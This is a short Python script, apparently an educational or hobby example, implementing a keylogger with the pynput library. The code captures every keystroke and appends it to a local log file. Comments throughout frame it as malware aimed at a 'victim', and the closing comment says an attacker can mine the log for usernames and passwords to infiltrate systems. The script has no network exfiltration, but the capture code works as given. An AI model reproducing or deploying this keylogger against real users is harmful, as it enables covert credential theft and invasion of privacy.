#A keylogger program is malware that keeps track of a vicitim's keystrokes. Attackers can go a step further and record the strokes and have them sent using a command and control server. 
#"pynput" is a library that allows you to monitor and listen to the events performed by the user via "keyboard".

from pynput import keyboard


#This function allows keylogging to take place once the code is run.

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey: #A log file is created once the program states to run to notate the victim's keystroke.
        try:
            char = key.char
            if char is not None:
                logKey.write(char)
            else:
                logKey.write(f"[{str(key)}]") #Non-character Keys logged.
        except Exception as e:
            print(f"Error getting char: {e}")  #Printed error message.

#Anytime the listener is turned "ON" and a key is pressed the action will be sent to the "keyPressed" function.

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

#After deploying the keylogger, an attacker can analyze the keystrokes to locate username and password information. This will allow the hacker to easily infiltrate an otherwise secure system.